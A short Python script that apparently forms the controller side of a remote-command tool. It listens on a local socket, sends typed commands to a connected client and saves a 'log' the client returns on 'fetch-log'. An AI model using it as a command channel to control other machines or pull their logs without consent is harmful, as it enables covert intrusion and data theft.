import socket


s = socket.socket()                     #Creates a new socket server

host = "127.0.0.1"                #Gets device hostname
port = 2233                             #Specifies port for communication
s.bind((host, port))                    #Binds the host and port

s.listen(5)                             #Looks for any incoming connections
c, addr = s.accept()                    #Accepts the connection
print("Connected to {0}".format(addr))

while True:
    
    msg = input("$> ")                  #Input dor entering remote command
    if(msg == "exit"):                  #Checks if the command given is exit
        c.send(b"exit")                     #Send the message saying connection was removed
        c.close()                       #If so, closes the connections
        break                           #Breaks the loop
    
    msg = bytes(msg, 'utf-8')           #Converts the message to Bytes

    c.send(msg)                         #Send the message

    if(msg == b"fetch-log"):
        fileLog = c.recv(1024)
        print("FileLog, received... \n")
        print(fileLog)
        saveFile = open("log.txt", "wb")
        saveFile.write(fileLog)

    